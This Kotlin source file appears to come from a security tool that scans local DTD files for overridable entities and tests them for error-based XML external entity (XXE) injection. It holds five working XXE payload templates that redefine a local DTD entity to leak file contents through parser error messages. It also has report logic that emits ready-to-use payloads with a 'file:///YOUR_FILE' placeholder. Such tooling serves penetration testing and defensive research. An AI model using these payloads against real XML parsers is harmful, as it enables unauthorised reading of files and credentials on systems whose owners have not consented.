@file:Suppress("JAVA_MODULE_DOES_NOT_EXPORT_PACKAGE")

import com.sun.org.apache.xerces.internal.impl.dtd.*
import javax.xml.parsers.DocumentBuilderFactory

import org.xml.sax.InputSource;
import com.sun.org.apache.xerces.internal.util.SAXInputSource
import com.sun.org.apache.xerces.internal.xni.parser.XMLErrorHandler
import com.sun.org.apache.xerces.internal.xni.parser.XMLParseException
import org.xml.sax.ErrorHandler
import org.xml.sax.SAXParseException
import java.io.*
import java.net.URL

class EntityTester {


    val ENTITY_REGEX = Regex(".*<!ENTITY\\s+%?\\s*([a-zA-Z\\-_]+)\\s.*")


    fun listOverridableEntities(dtdFile:String): ArrayList<String> {
        return try {
            listOverridableEntitiesXerces(FileInputStream(dtdFile))
        } catch (e: XMLParseException) {
            listOverridableEntitiesWithRegex(FileInputStream(dtdFile))
        }
    }

    /**
     * Used to supported load DTD file from the classpath (for tests)
     */
    fun listOverridableEntities(dtdFile: URL): ArrayList<String> {
        return try {
            listOverridableEntitiesXerces(dtdFile.openStream())
        } catch (e: XMLParseException) {
            listOverridableEntitiesWithRegex(dtdFile.openStream())
        }
    }

    /**
     * Parse the DTD file and identify the entities that are declared in this
     */
    fun listOverridableEntitiesXerces(dtdStream: InputStream): ArrayList<String> {

        val source = SAXInputSource(InputSource(InputStreamReader(dtdStream)))
        val d =  XMLDTDLoader()

        //Will hide mostly "The entity "p" was referenced, but not declared"
        d.errorHandler = object: XMLErrorHandler {
            override fun warning(domain: String?, key: String?, exception: XMLParseException) {
            }

            override fun error(domain: String?, key: String?, exception: XMLParseException) {
            }

            override fun fatalError(domain: String?, key: String?, exception: XMLParseException) {
            }
        }


        val g = d.loadGrammar(source) as DTDGrammar

        val entitiesFound = ArrayList<String>()

        //Entities
        var entityIndex = 0
        val entityDecl = XMLEntityDecl()
        while (g.getEntityDecl(entityIndex++, entityDecl)) {
            entitiesFound.add(entityDecl.name.replace("%", ""))
        }
        return entitiesFound


    }

    fun listOverridableEntitiesWithRegex(inputStream: InputStream): ArrayList<String> {

        val reader = InputStreamReader(inputStream)

        val entities = arrayListOf<String>()
        reader.forEachLine {line ->
            //println(line)
            val res = ENTITY_REGEX.find(line)
            if (res?.groupValues != null) {
                val e = res.groupValues[1]
                //println(res.groupValues[0])
                entities.add(e)
            }
        }

        return entities
    }

    fun findInjectableEntity(dtdFullPath:String, originalPath:String, entitiesToTests:ArrayList<String>, reporter:XxeReporter) {

        val factory = DocumentBuilderFactory.newInstance()
        val builder = factory.newDocumentBuilder()

        //The parser will likely logged to the console Fatal error .. We can disable all this for cleaner output
        builder.setErrorHandler(
            object : ErrorHandler {
                override fun warning(exception: SAXParseException?) {
//                    println(" [!] ${exception!!.message}")
                }

                override fun error(exception: SAXParseException?) {
//                    println(" [!!] ${exception!!.message}")
                }

                override fun fatalError(exception: SAXParseException?) {
//                    println(" [!!!] ${exception!!.message}")
                }

            }
        )

        try {
            val payload = """
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">
    %local_dtd;
]>
<message></message>
"""
            builder.parse(ByteArrayInputStream(payload.toByteArray(Charsets.UTF_8)))
        }
        catch (e:Exception) { //The DTD is probably malformed
            println(" [??] ${e.javaClass.name} : ${e.message}")
        }



        println("Testing ${entitiesToTests.size} entities : $entitiesToTests")

        for(entity in entitiesToTests) {
            val entityName = entity.replace("%","")

            val magicValue = "INJECTION_12345"

            //#1 Inline
            val payloadInline = """
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">

    <!ENTITY % $entityName '
        <!ENTITY &#x25; file "$magicValue">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
"""

            //#2 Inside tag
            val payloadElementSimple = """
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">

    <!ENTITY % $entityName '>
        <!ENTITY &#x25; file "$magicValue">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
"""


            //#3 Open parentheses
            val payloadElementOpenParentheses = """
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">

    <!ENTITY % $entityName '(aa)>
        <!ENTITY &#x25; file "$magicValue">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
"""

            //#4 Closing parentheses
            val payloadElementClosingParentheses = """
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">

    <!ENTITY % $entityName 'aaa)>
        <!ENTITY &#x25; file "$magicValue">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
"""

            //#5 Attribute list
            val payloadAttributeList = """
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">

    <!ENTITY % $entityName '(aa) #IMPLIED>
        <!ENTITY &#x25; file "$magicValue">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
"""

            val payloads = arrayOf(payloadInline,
                    payloadElementSimple,payloadElementOpenParentheses,payloadElementClosingParentheses,
                    payloadAttributeList)


            for (payload in payloads) {
//                println(" [-] Entity name: $entityName")
//
                try {
                    val doc = builder.parse(ByteArrayInputStream(payload.toByteArray(Charsets.UTF_8)))


//                    println("????? NO ERROR ?????")
//                    println("XML result: " + doc.getElementsByTagName("message").item(0).textContent)

                } catch (e: FileNotFoundException) {
                    if (e.message!!.contains(magicValue)) {
                        println(" [+] The entity $entity is injectable")

                        var payloadClean = payload.replace("\"$magicValue\"","SYSTEM \"file:///YOUR_FILE\"")
                        payloadClean = payloadClean.replace(dtdFullPath,originalPath).trim()
                        reporter.newPayload("/$originalPath", entity, payloadClean)

                        //return
                        //println("Payload used:")
                        //println(payload)
                    }
                } catch (e: Exception) {
                    //Failed
//                    println(" [!] $e.message")
                    ///e.printStackTrace()
                }
            }
        }


        //val entries = doc.getElementsByTagName("*")

//    for (i in 0 until entries.length) {
//        val element = entries.item(i) as Element
//        System.out.println("Found element " + element.getNodeName() + element.textContent)
//
//    }
    }

}
